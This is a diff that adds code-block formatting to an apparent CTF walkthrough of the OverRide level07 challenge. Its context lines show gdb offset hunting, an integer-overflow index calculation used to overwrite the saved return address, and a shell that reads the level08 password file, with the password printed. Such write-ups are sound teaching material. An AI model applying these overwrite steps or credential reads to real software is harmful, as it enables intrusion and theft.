@@ -1,4 +1,5 @@
 ***
+```
    level07@OverRide:~$ ./level07
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!
@@ -36,7 +37,7 @@
    Number at data[2] is 4294967295
    Completed read command successfully
    Input command: quit
-
+```
 ***
 
    level07@OverRide:~$ gdb level07
@@ -109,7 +110,7 @@ For this let's get eip and array addresses on stack:
    ebp at 0xffffd708, eip at 0xffffd70c   # eip at 0xffffd70c -  address eip is saved at = main return address
 
   ***
-
+```
    # Let's find where array is located
 
    (gdb) b read_number
@@ -132,7 +133,7 @@ For this let's get eip and array addresses on stack:
    Breakpoint 1, 0x080486dd in read_number ()
    (gdb) x $ebp+0x8              # at this point location of data array is loaded on stack in read_number function
    0xffffd520:     0xffffd544    # 0xffffd544 - array address (altered by gdb with env variables); 0xffffd520 - its place on stack
-
+```
 ***
 
    (gdb) p 0xffffd70c - 0xffffd544     # offset in main of saved return address from the array
@@ -170,7 +171,7 @@ To store runtime array address at eip we also has to use this trick:
 - Index 114: (2^(32) + (114 * 4)) / 4 = 1073741938
 
 ***
-
+```
    level07@OverRide:~$ ./level07
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!
@@ -220,3 +221,4 @@ To store runtime array address at eip we also has to use this trick:
    level08
    $ cat /home/users/level08/.pass
    7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
